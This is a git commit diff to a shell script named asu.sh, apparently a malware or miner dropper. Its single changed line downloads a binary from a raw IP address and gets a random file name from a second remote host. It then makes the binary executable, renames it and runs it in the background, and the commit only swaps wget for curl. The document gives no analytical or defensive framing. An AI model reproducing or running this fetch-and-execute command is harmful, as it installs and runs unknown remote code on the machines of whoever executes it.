c39eeb6af8e99c373749c8b596e483454864072c
ALICLAYSMEN <58400825+ALICLAYSMEN@users.noreply.github.com>
2022-07-09 08:48:28 +0700

    Update asu.sh

--- asu.sh
+++ asu.sh
@@ -1,1 +1,1 @@
-nohup wget http://139.59.230.245:7800/down/j416CAnwxPfZ &&  ACAK=$(echo $(curl -s https://gaspol.space/rand.php)) && chmod +x j416CAnwxPfZ && sed -i -e 's/\r$//' j416CAnwxPfZ && mv j416CAnwxPfZ $ACAK && ./$ACAK &>/dev/null &
+curl -sLO http://139.59.230.245:7800/down/j416CAnwxPfZ &&  ACAK=$(echo $(curl -s https://gaspol.space/rand.php)) && chmod +x j416CAnwxPfZ && sed -i -e 's/\r$//' j416CAnwxPfZ && mv j416CAnwxPfZ $ACAK && ./$ACAK &
